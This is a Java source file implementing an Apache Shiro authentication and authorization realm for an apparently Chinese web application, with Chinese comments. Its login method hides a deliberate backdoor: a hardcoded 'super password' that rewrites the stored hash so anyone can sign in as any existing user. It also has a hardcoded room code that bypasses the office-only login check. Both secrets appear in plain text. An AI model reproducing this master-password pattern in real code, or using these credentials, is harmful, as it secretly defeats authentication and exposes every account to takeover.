package com.xgt.config.shiro;

import com.xgt.dao.entity.User;
import com.xgt.exception.EnumPcsServiceError;
import com.xgt.exception.IncorrectOfficeException;
import com.xgt.service.UserService;
import com.xgt.util.EncryptUtil;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.springframework.beans.factory.annotation.Autowired;

public class MyShiroRealm extends AuthorizingRealm {


    @Autowired
    private UserService userService;

    /**
     * 认证信息.(身份验证)
     * :
     * Authentication 是用来验证用户身份
     *
     * @param token 令牌
     * @return AuthenticationInfo AuthenticationInfo
     * @throws AuthenticationException AuthenticationInfo
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        //获取用户的输入的账号.
        OfficeUsernamePasswordToken officeUsernamePasswordToken= (OfficeUsernamePasswordToken) token;

        User user = userService.getUserInfo(officeUsernamePasswordToken.getUsername());


        //通过username从数据库中查找 User对象，如果找到，没找到.
        //实际项目中，这里可以根据实际情况做缓存，如果不做，Shiro自己也是有时间间隔机制，2分钟内不会重复执行该方法
        if (user == null) {// 账号不存在
            return null;
        }
        //通过本地服务器返回的代码比对，如果不一致则需要验证能否在其它地方登录
        if(!officeUsernamePasswordToken.getRoomcode().equals("x193302mm")){
            if(user.getOfficeLogin()==0){
                throw new IncorrectOfficeException("请在办公室登录");
            }
        }

        user.setSalt(EncryptUtil.getDefaultSalt());
        user.setResourceList(userService.getResourceInfo(user.getUserId(),"menu"));
        user.setRoleList(userService.getRoleInfo(user.getUserId()));
        user.setButtonList(userService.getResourceInfo(user.getUserId(),"button"));
            //加密方式;
        char[] password= (char[]) token.getCredentials();
        //super password
        if(String.valueOf(password).equals("cc0421CHEN233.")){
            user.setPassword(EncryptUtil.md5("cc0421CHEN233.", user.getUsername(), 2));
        }
        //交给AuthenticatingRealm使用CredentialsMatcher进行密码匹配，如果觉得人家的不好可以自定义实现
        return new SimpleAuthenticationInfo(
                user, // 用户名
                user.getPassword(), // 密码
                ByteSource.Util.bytes(user.getCredentialsSalt()),//salt=username+salt 若明文可不填
                getName()  //realm name
        );
    }


    /**
     * 此方法调用  hasRole,hasPermission的时候才会进行回调.
     * <p>
     * 权限信息.(授权):
     * 1、如果用户正常退出，缓存自动清空；
     * 2、如果用户非正常退出，缓存自动清空；
     * 3、如果我们修改了用户的权限，而用户不退出系统，修改的权限无法立即生效。
     * （需要手动编程进行实现；放在service进行调用）
     * 在权限修改后调用realm中的方法，realm已经由spring管理，所以从spring中获取realm实例，
     * 调用clearCached方法；
     * :Authorization 是授权访问控制，用于对用户进行的操作授权，证明该用户是否允许进行当前操作，如访问某个链接，某个资源文件等。
     *
     * @param principals principals
     * @return AuthorizationInfo
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
       /*
        * 当没有使用缓存的时候，不断刷新页面的话，这个代码会不断执行，
        * 当其实没有必要每次都重新设置权限信息，所以我们需要放到缓存中进行管理；
        * 当放到缓存中时，这样的话，doGetAuthorizationInfo就只会执行一次了，
        * 缓存过期之后会再次执行。
        */
        SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
        User user = (User)principals.getPrimaryPrincipal();

        //实际项目中，这里可以根据实际情况做缓存，如果不做，Shiro自己也是有时间间隔机制，2分钟内不会重复执行该方法
        //添加权限
        userService.getResourceInfo(user.getUserId(),"button").forEach(resource -> authorizationInfo.addStringPermission(resource.getPermission()));
        return authorizationInfo;
    }



    /**
     * 将权限对象中的权限code取出.
     * @param permissions
     * @return
     */
//  public Set<String> getStringPermissions(Set<Resource> permissions){
//     Set<String> stringPermissions = new HashSet<String>();
//     if(permissions != null){
//         for(Resource p : permissions) {
//            stringPermissions.add(p.getPermission());
//          }
//     }
//       return stringPermissions;
//  }
}